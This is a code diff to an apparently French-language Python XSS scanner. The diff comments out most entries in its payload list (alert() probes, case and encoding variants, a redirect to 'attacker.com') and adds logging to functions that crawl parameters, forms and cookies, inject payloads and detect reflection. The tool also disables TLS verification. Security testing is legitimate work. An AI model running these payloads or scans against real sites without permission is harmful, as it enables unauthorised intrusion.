@@ -13,45 +13,45 @@ XSS_PAYLOADS = [
     "<script>document.location='http://attacker.com'</script>",
 
     # Event handlers
-    "<img src=x onerror=alert('XSS')>",
-    "<img src=x onerror=prompt('XSS')>",
-    "<img src=x onerror=confirm('XSS')>",
-    "<body onload=alert('XSS')>",
-    "<svg onload=alert('XSS')>",
-    "<svg/onload=prompt('XSS')>",
-    "<svg/onload=confirm('XSS')>",
-    "<input type='text' onfocus=alert('XSS')>",
-    "<input type='text' onmouseover=alert('XSS')>",
-    "<a href='#' onmouseover=alert('XSS')>Hover me</a>",
-    "<iframe onload=alert('XSS')></iframe>",
-    "<video onerror=alert('XSS')><source /></video>",
-    "<audio onerror=alert('XSS')><source /></audio>",
-    "<details ontoggle=alert('XSS')>",
+    # "<img src=x onerror=alert('XSS')>",
+    # "<img src=x onerror=prompt('XSS')>",
+    # "<img src=x onerror=confirm('XSS')>",
+    # "<body onload=alert('XSS')>",
+    # "<svg onload=alert('XSS')>",
+    # "<svg/onload=prompt('XSS')>",
+    # "<svg/onload=confirm('XSS')>",
+    # "<input type='text' onfocus=alert('XSS')>",
+    # "<input type='text' onmouseover=alert('XSS')>",
+    # "<a href='#' onmouseover=alert('XSS')>Hover me</a>",
+    # "<iframe onload=alert('XSS')></iframe>",
+    # "<video onerror=alert('XSS')><source /></video>",
+    # "<audio onerror=alert('XSS')><source /></audio>",
+    # "<details ontoggle=alert('XSS')>",
 
-    # Tag variations
-    "<ScRiPt>alert('XSS')</ScRiPt>",
-    "<sCrIpT>alert('XSS')</sCrIpT>",
-    "<IMG SRC=x onerror=alert('XSS')>",
-    "<svg/OnLoAd=alert('XSS')>",
-    "<BODY ONLOAD=alert('XSS')>",
+    # # Tag variations
+    # "<ScRiPt>alert('XSS')</ScRiPt>",
+    # "<sCrIpT>alert('XSS')</sCrIpT>",
+    # "<IMG SRC=x onerror=alert('XSS')>",
+    # "<svg/OnLoAd=alert('XSS')>",
+    # "<BODY ONLOAD=alert('XSS')>",
 
-    # Encoding and obfuscation
-    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
-    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
-    "javascript:alert('XSS')",
-    "javascri\pt:alert('XSS')",
-    "jav&#x09;ascript:alert('XSS')",
-    "data:text/html,<script>alert('XSS')</script>",
-    "``;alert('XSS');//",
-    "';alert('XSS');//",
-    "\"';alert('XSS');//",
-    "\\';alert('XSS');//",
-    "\\\"';alert('XSS');//",
-    "';!--\"<XSS>=&{()}",
-    "'\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
-    "'\\x3cimg src=x onerror=alert(1)\\x3e",
-    "\"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
-    "\"\\x3cimg src=x onerror=alert(1)\\x3e",
+    # # Encoding and obfuscation
+    # "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
+    # "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+    # "javascript:alert('XSS')",
+    # "javascri\pt:alert('XSS')",
+    # "jav&#x09;ascript:alert('XSS')",
+    # "data:text/html,<script>alert('XSS')</script>",
+    # "``;alert('XSS');//",
+    # "';alert('XSS');//",
+    # "\"';alert('XSS');//",
+    # "\\';alert('XSS');//",
+    # "\\\"';alert('XSS');//",
+    # "';!--\"<XSS>=&{()}",
+    # "'\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+    # "'\\x3cimg src=x onerror=alert(1)\\x3e",
+    # "\"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+    # "\"\\x3cimg src=x onerror=alert(1)\\x3e",
 
     # # Context-specific payloads
     # "'><script>alert(1)</script>",
@@ -295,6 +295,7 @@ def find_xss_in_urls(target, session=None):
                 params = parsed_url.query.split("&")
                 for param in params:
                     name = param.split("=")[0]
+                    print(f"[!!!] {full_url} - {name}")
                     detected_params.append({"url": full_url, "param": name})
         
         return detected_params
@@ -304,6 +305,7 @@ def find_xss_in_urls(target, session=None):
 
 def find_xss_in_forms(target, session=None):
     """Recherche des formulaires pouvant être vulnérables à XSS."""
+    print("[!]~] Recherche des formulaires...")
     if not session:
         session = requests.Session()
     session.verify = False
@@ -319,6 +321,7 @@ def find_xss_in_forms(target, session=None):
             
             full_action_url = urljoin(target, action) if action else target
             detected_forms.append({"action": full_action_url, "method": method, "inputs": inputs})
+            print(f"[!!!] {full_action_url} - {inputs}")
         
         return detected_forms
     except requests.exceptions.RequestException as e:
@@ -327,12 +330,14 @@ def find_xss_in_forms(target, session=None):
 
 def find_xss_in_cookies(target, session=None):
     """Recherche des cookies susceptibles d'être vulnérables à XSS."""
+    print("[!]~] Recherche des cookies...")
     if not session:
         session = requests.Session()
     session.verify = False
     try:
         response = session.get(target, timeout=5)
         cookies = response.cookies.get_dict()
+        print(f"[!!!] Cookies : {cookies}")
         return cookies
     except requests.exceptions.RequestException as e:
         print(f"[!][!][XXX] Erreur lors de la requête : {e}\n")
@@ -340,6 +345,7 @@ def find_xss_in_cookies(target, session=None):
 
 def test_xss(target_url, param, method="get", session=None):
     """Teste l'injection de payloads XSS sur un paramètre donné."""
+    print(f"[!]~] Test XSS sur {target_url}...")
     if not session:
         session = requests.Session()
     session.verify = False
@@ -353,6 +359,7 @@ def test_xss(target_url, param, method="get", session=None):
             response_text = response.text.lower()
             if payload.lower() in response_text:
                 print(f" XSS détectée sur {test_url} avec le payload : {payload}")
+                print(f"[!!!]🔥 XSS détectée sur {test_url} !")
                 return {"url": test_url, "payload": payload}
         except requests.exceptions.RequestException as e:
             print(f"[!][!][XXX] Erreur lors de la requête XSS : {e}")
